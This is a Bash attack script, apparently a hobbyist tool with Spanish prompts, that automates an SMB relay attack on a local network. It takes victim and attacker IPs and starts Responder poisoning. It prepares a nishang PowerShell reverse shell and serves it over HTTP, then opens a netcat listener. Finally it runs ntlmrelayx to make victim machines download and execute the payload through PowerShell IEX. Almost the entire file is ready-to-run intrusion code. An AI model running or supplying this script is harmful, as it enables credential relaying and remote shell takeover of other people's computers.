#!/bin/bash

echo "												"
echo "		  ██████  ███▄ ▄███▓ ▄▄▄▄    ██▀███  ▓█████  ██▓    ▄▄▄     ▓██   ██▓		"
echo "		▒██    ▒ ▓██▒▀█▀ ██▒▓█████▄ ▓██ ▒ ██▒▓█   ▀ ▓██▒   ▒████▄    ▒██  ██▒		"
echo "		░ ▓██▄   ▓██    ▓██░▒██▒ ▄██▓██ ░▄█ ▒▒███   ▒██░   ▒██  ▀█▄   ▒██ ██░		"
echo "		  ▒   ██▒▒██    ▒██ ▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄ ▒██░   ░██▄▄▄▄██  ░ ▐██▓░		"
echo "		▒██████▒▒▒██▒   ░██▒░▓█  ▀█▓░██▓ ▒██▒░▒████▒░██████▒▓█   ▓██▒ ░ ██▒▓░		"
echo "		▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ 		"
echo "		░ ░▒  ░ ░░  ░      ░▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░ 		"
echo "		░  ░  ░  ░      ░    ░    ░   ░░   ░    ░     ░ ░    ░   ▒   ▒ ▒ ░░  		"
echo "		      ░         ░    ░         ░        ░  ░    ░  ░     ░  ░░ ░     		"
echo "		                          ░                                  ░ ░     		"

echo "													   "
echo "	 												   "
echo "					[Created By Anonimo501] 					   "
echo "				  [https://youtube.com/c/Anonimo501]					   "
echo "													   "
echo "				    Hola bienvenid@s a SMB_Relay		                           "
echo "					      Version 1							   "
echo "													   "
echo "													   "
read -rsp $'Press enter to continue...\n'

echo ""
echo "*								*"
echo "*	Ingrese la IP de Red Ejemplo: 192.168.1.0/24 		*"
echo "*								*"
echo ""
read ipdered

echo "----------------------------------------------------------------"

echo ""
echo "*                                                 		*"
echo "*	Ingrese la interface de Red Ejemplo: eth0 		*"
echo "*                                                 		*"
echo ""
read ethred

echo "----------------------------------------------------------------"

echo ""
echo "*         	                                           	*"
echo "* 	Ingrese la IP de la victima Ejemplo: 192.168.1.10  	*"
echo "*                 	                                   	*"
echo ""
read victima

echo "----------------------------------------------------------------"

echo ""
echo "*                                                    		*"
echo "*	Ingrese la IP del Atacante/Hacker Ejemplo: 192.168.1.20 *"
echo "*                                                    		*"
echo ""
read hacker

echo "----------------------------------------------------------------"

	#### Comando para ver los equipos en red con smb activo y con la herramienta Crackmapexec ####
	gnome-terminal -e "crackmapexec smb $ipdered" &

	### se borra y se sobrescribe el archivo Responder.conf modificando SMB y HTTP a Off###
	perl -pi -e "s[SMB = On][SMB = Off]g" /usr/share/responder/Responder.conf
	perl -pi -e "s[HTTP = On][HTTP = Off]g" /usr/share/responder/Responder.conf
	gnome-terminal -e "responder -I $ethred -rdw"

	### instalamos nishang crearemos un archivo PS.ps1 con la ip del Atacante/Hacker ###
	git clone https://github.com/samratashok/nishang
	### ingresamos a la carpeta Shells ###
	cd nishang/Shells/
	### copiamos el archivo Invoke-PowerShellTcp.ps1 y nombramos el nuevo con el nombre PS.ps1 ###
	cp Invoke-PowerShellTcp.ps1 PS.ps1
	### Añadimos la ip atacante al archivo PS.ps1 al final del archivo ###
	echo "Invoke-PowerShellTcp -Reverse -IPAddress $hacker -Port 4444" >> PS.ps1

	### ejecutamos un server local por el puerto 8000 ###
	gnome-terminal -e "python -m SimpleHTTPServer" &

cd ..
cd ..

	### instalamos rlwrap y luego dejamos a la escucha por el puerto 4444 ###
	apt install rlwrap -y
	gnome-terminal -e "rlwrap nc -nlvp 4444" 

	### instalamos impacket e intentamos acceder al equipo victima ###
	git clone https://github.com/SecureAuthCorp/impacket.git
	cd impacket
	pip3 install -r requirements.txt
	python3 setup.py install
	cd examples

echo "
$victima
" >> targets.txt

echo ""
echo "		*					*"
echo "		*	EMPECEMOS LA DIVERSION		*"
echo "		*					*"
echo ""

read -rsp $'Press enter to continue...\n'
python3 ntlmrelayx.py -tf targets.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$hacker:8000/PS.ps1')" -smb2support
